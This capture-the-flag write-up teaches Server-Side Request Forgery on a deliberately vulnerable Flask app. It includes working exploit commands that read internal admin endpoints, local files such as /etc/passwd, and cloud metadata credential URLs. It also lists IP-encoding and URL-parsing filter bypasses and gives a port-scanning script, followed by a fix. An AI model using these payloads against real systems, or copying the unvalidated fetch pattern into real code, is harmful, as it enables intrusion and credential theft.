---
title: "Web - Server-Side Request Forgery"
description: "Exploiting a Server-Side Request Forgery vulnerability to access internal services and retrieve the flag from a restricted admin endpoint."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Medium             |
| Points     | 300                |
| Flag       | `zemi{ssrf_1nt3rn4l_4cc3ss}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-ssrf/app.py)
- [flag.txt](/Website/challenges/web-ssrf/flag.txt)
- [README.md](/Website/challenges/web-ssrf/README.md)
- [requirements.txt](/Website/challenges/web-ssrf/requirements.txt)

## Overview

Server-Side Request Forgery (SSRF) occurs when an attacker can make the server initiate HTTP requests to arbitrary destinations. This is dangerous because the server often has access to internal resources that are not reachable from the outside: admin panels bound to localhost, cloud metadata APIs, internal microservices, and databases. By convincing the server to fetch a URL on our behalf, we can reach things we should never be able to touch.

## Setting Up the Challenge Locally

We need two components: a public-facing web app with a URL fetching feature, and an internal admin service that is only accessible from localhost.

Save the following as `app.py` and run it with `python3 app.py`:

```python
from flask import Flask, request, jsonify, render_template_string
import requests as http_requests
import threading

# ============================================================
# INTERNAL ADMIN SERVICE (only listens on 127.0.0.1:8081)
# ============================================================
internal_app = Flask("internal")

@internal_app.route("/admin/flag")
def admin_flag():
    """This endpoint is only accessible from localhost."""
    return jsonify({
        "message": "Internal admin panel",
        "flag": "zemi{ssrf_1nt3rn4l_4cc3ss}",
        "note": "This should never be reachable from the internet"
    })

@internal_app.route("/admin/config")
def admin_config():
    return jsonify({
        "db_host": "internal-db.local",
        "db_password": "s3cretP4ss!",
        "api_keys": {"stripe": "sk_live_FAKE123", "aws": "AKIA_FAKE456"}
    })

def run_internal():
    internal_app.run(host="127.0.0.1", port=8081)

# ============================================================
# PUBLIC WEB APPLICATION (listens on 0.0.0.0:5000)
# ============================================================
app = Flask("public")

PAGE = """
<!DOCTYPE html>
<html>
<head><title>URL Preview Service</title></head>
<body>
  <h1>URL Preview Tool</h1>
  <p>Enter a URL to fetch and preview its content:</p>
  <form method="POST" action="/fetch">
    <input type="text" name="url" placeholder="https://example.com" size="60">
    <button type="submit">Fetch</button>
  </form>
  {% if content %}
  <h2>Response:</h2>
  <pre>{{ content }}</pre>
  {% endif %}
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(PAGE)

@app.route("/fetch", methods=["POST"])
def fetch():
    url = request.form.get("url", "")
    if not url:
        return render_template_string(PAGE, content="Please provide a URL.")

    try:
        # VULNERABLE: The server fetches any URL the user provides
        # with no restriction on destination
        resp = http_requests.get(url, timeout=5)
        content = resp.text[:5000]  # Truncate for display
    except Exception as e:
        content = f"Error fetching URL: {str(e)}"

    return render_template_string(PAGE, content=content)

if __name__ == "__main__":
    # Start internal service in a background thread
    t = threading.Thread(target=run_internal, daemon=True)
    t.start()
    print("[*] Internal admin service running on 127.0.0.1:8081")
    print("[*] Public web app running on 0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000)
```

Run it with `python3 app.py`. The public app is at `http://localhost:5000` and the internal service is at `http://127.0.0.1:8081` (only accessible from the server itself).

## Reconnaissance

The application is a "URL Preview Tool" — you give it a URL and it fetches the content and displays it. This is a classic SSRF vector.

Let's test with an external URL first:

```bash
curl -s -X POST http://localhost:5000/fetch -d "url=https://httpbin.org/ip"
```

The app fetches the URL from its own IP address and returns the content. Now let's try to reach internal services.

## Exploitation

### Step 1: Probe for internal services

The internal admin service runs on port 8081 on localhost. Let's try to reach it through the SSRF:

```bash
curl -s -X POST http://localhost:5000/fetch -d "url=http://127.0.0.1:8081/"
```

We get a response from the internal server. The web app fetches the URL on our behalf, and since the request originates from the server itself, localhost endpoints are reachable.

### Step 2: Access the admin flag endpoint

```bash
curl -s -X POST http://localhost:5000/fetch \
  -d "url=http://127.0.0.1:8081/admin/flag"
```

Response:

```
{"flag":"zemi{ssrf_1nt3rn4l_4cc3ss}","message":"Internal admin panel","note":"This should never be reachable from the internet"}
```

### Step 3: Exfiltrate internal configuration

```bash
curl -s -X POST http://localhost:5000/fetch \
  -d "url=http://127.0.0.1:8081/admin/config"
```

Response:

```json
{
    "db_host": "internal-db.local",
    "db_password": "s3cretP4ss!",
    "api_keys": {"stripe": "sk_live_FAKE123", "aws": "AKIA_FAKE456"}
}
```

We just retrieved database credentials and API keys from an internal service.

### Step 4: Reading local files with file://

Some SSRF implementations allow the `file://` protocol scheme, which reads files from the local filesystem:

```bash
curl -s -X POST http://localhost:5000/fetch -d "url=file:///etc/passwd"
```

If the HTTP client library supports it, this returns the contents of `/etc/passwd`.

```bash
curl -s -X POST http://localhost:5000/fetch -d "url=file:///proc/self/environ"
```

This can leak environment variables, which often contain secrets.

## Bypassing URL Filters

Many applications attempt to block SSRF by filtering URLs. Here are common bypass techniques.

### If `127.0.0.1` or `localhost` is blocked

```bash
# Decimal notation (2130706433 = 127.0.0.1)
curl -s -X POST http://localhost:5000/fetch -d "url=http://2130706433:8081/admin/flag"

# Hex notation
curl -s -X POST http://localhost:5000/fetch -d "url=http://0x7f000001:8081/admin/flag"

# Octal notation
curl -s -X POST http://localhost:5000/fetch -d "url=http://0177.0.0.1:8081/admin/flag"

# IPv6 loopback
curl -s -X POST http://localhost:5000/fetch -d "url=http://[::1]:8081/admin/flag"

# Shorthand IPv6
curl -s -X POST http://localhost:5000/fetch -d "url=http://[0:0:0:0:0:0:0:1]:8081/admin/flag"

# 0.0.0.0 (sometimes resolves to localhost)
curl -s -X POST http://localhost:5000/fetch -d "url=http://0.0.0.0:8081/admin/flag"

# Overflow — 127.0.0.1 with leading zeros
curl -s -X POST http://localhost:5000/fetch -d "url=http://127.1:8081/admin/flag"
```

### URL parsing tricks

```bash
# Using @ — the part before @ is treated as credentials, ignored by many parsers
curl -s -X POST http://localhost:5000/fetch \
  -d "url=http://allowed-domain.com@127.0.0.1:8081/admin/flag"

# URL encoding
curl -s -X POST http://localhost:5000/fetch \
  -d "url=http://%31%32%37%2e%30%2e%30%2e%31:8081/admin/flag"

# Double URL encoding (if the app decodes twice)
curl -s -X POST http://localhost:5000/fetch \
  -d "url=http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:8081/admin/flag"
```

### DNS rebinding concept

DNS rebinding is an advanced bypass for SSRF protections that validate the resolved IP address:

1. The attacker controls a domain (e.g., `evil.attacker.com`)
2. The first DNS resolution returns a safe public IP (passes the filter check)
3. The domain's TTL is set to 0 so the server re-resolves for the actual request
4. The second DNS resolution returns `127.0.0.1` (the actual fetch hits localhost)

Services like `rebind.it` or custom DNS servers can automate this.

### Cloud metadata endpoints

In cloud environments, SSRF can access instance metadata services:

```bash
# AWS EC2 metadata (IMDSv1)
curl -s -X POST http://localhost:5000/fetch \
  -d "url=http://169.254.169.254/latest/meta-data/"

# AWS IAM credentials
curl -s -X POST http://localhost:5000/fetch \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP metadata
curl -s -X POST http://localhost:5000/fetch \
  -d "url=http://metadata.google.internal/computeMetadata/v1/"

# Azure metadata
curl -s -X POST http://localhost:5000/fetch \
  -d "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

## Port Scanning via SSRF

SSRF can be used to map internal services by observing response differences:

```python
#!/usr/bin/env python3
"""Use SSRF to scan internal ports."""

import requests
import sys

TARGET = "http://localhost:5000/fetch"

for port in range(8080, 8090):
    url = f"http://127.0.0.1:{port}/"
    resp = requests.post(TARGET, data={"url": url}, timeout=10)

    if "Error fetching" not in resp.text:
        print(f"[+] Port {port} is OPEN — got response")
    else:
        print(f"[-] Port {port} is closed or filtered")
```

## The Vulnerable Code (Explained)

```python
@app.route("/fetch", methods=["POST"])
def fetch():
    url = request.form.get("url", "")
    # VULNERABLE: No validation of the URL destination.
    # The server will fetch ANY URL, including internal services,
    # localhost endpoints, and even file:// paths.
    resp = http_requests.get(url, timeout=5)
    return render_template_string(PAGE, content=resp.text)
```

The problem: the server acts as an open proxy. It makes requests on the user's behalf with no restrictions on where those requests go.

## The Fix

```python
from urllib.parse import urlparse
import ipaddress
import socket

ALLOWED_SCHEMES = {"http", "https"}
BLOCKED_RANGES = [
    ipaddress.ip_network("127.0.0.0/8"),       # Loopback
    ipaddress.ip_network("10.0.0.0/8"),         # Private
    ipaddress.ip_network("172.16.0.0/12"),      # Private
    ipaddress.ip_network("192.168.0.0/16"),     # Private
    ipaddress.ip_network("169.254.0.0/16"),     # Link-local / cloud metadata
    ipaddress.ip_network("::1/128"),            # IPv6 loopback
    ipaddress.ip_network("fc00::/7"),           # IPv6 private
]

def is_safe_url(url):
    """Validate that the URL does not point to an internal resource."""
    try:
        parsed = urlparse(url)
    except Exception:
        return False

    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False

    # Resolve hostname to IP
    hostname = parsed.hostname
    if not hostname:
        return False

    try:
        resolved_ip = socket.getaddrinfo(hostname, None)[0][4][0]
        ip = ipaddress.ip_address(resolved_ip)
    except (socket.gaierror, ValueError):
        return False

    # Check if IP is in a blocked range
    for network in BLOCKED_RANGES:
        if ip in network:
            return False

    return True

@app.route("/fetch", methods=["POST"])
def fetch():
    url = request.form.get("url", "")
    if not url:
        return render_template_string(PAGE, content="Please provide a URL.")

    # FIX: Validate the URL before fetching
    if not is_safe_url(url):
        return render_template_string(PAGE, content="Blocked: URL points to a restricted address.")

    try:
        resp = http_requests.get(url, timeout=5, allow_redirects=False)
        content = resp.text[:5000]
    except Exception as e:
        content = f"Error: {str(e)}"

    return render_template_string(PAGE, content=content)
```

Key changes:
1. **Allowlist URL schemes** — only `http` and `https`, blocking `file://`, `gopher://`, etc.
2. **Resolve the hostname and check the IP** against a blocklist of private/internal ranges
3. **Disable redirects** (`allow_redirects=False`) — an attacker could use an external URL that redirects to `http://127.0.0.1`
4. **Use an allowlist** of permitted domains if possible — this is even more secure than a blocklist
5. **Network segmentation** — as defense in depth, ensure the web server cannot reach sensitive internal services at the network level

> **Note:** Even this fix is not perfect against DNS rebinding. For complete protection, re-resolve the hostname immediately before making the request and verify the IP again, or use a custom DNS resolver that pins the resolution.

## Tools Used

- **curl** — sending crafted URLs to the SSRF endpoint
- **Python + requests** — automated port scanning and enumeration via SSRF
- **Burp Suite Collaborator** — (optional) detecting blind SSRF with out-of-band callbacks
- **SSRFmap** — automated SSRF detection and exploitation tool

## Lessons Learned

- **Never** let user input control the destination of server-side HTTP requests without strict validation
- SSRF can access internal services, cloud metadata, and local files — it is not just about making HTTP requests
- IP-based blocklists can be bypassed with alternative representations (decimal, hex, IPv6) — validate after DNS resolution
- Disable URL redirects in the HTTP client to prevent redirect-based bypasses
- Cloud environments are particularly at risk because of metadata endpoints at `169.254.169.254`
- Network segmentation is the strongest defense — even if the application is vulnerable, the internal services should not be reachable from the web server's network segment
- SSRF is in the OWASP Top 10 (2021) as its own category — it is considered one of the most impactful web vulnerabilities
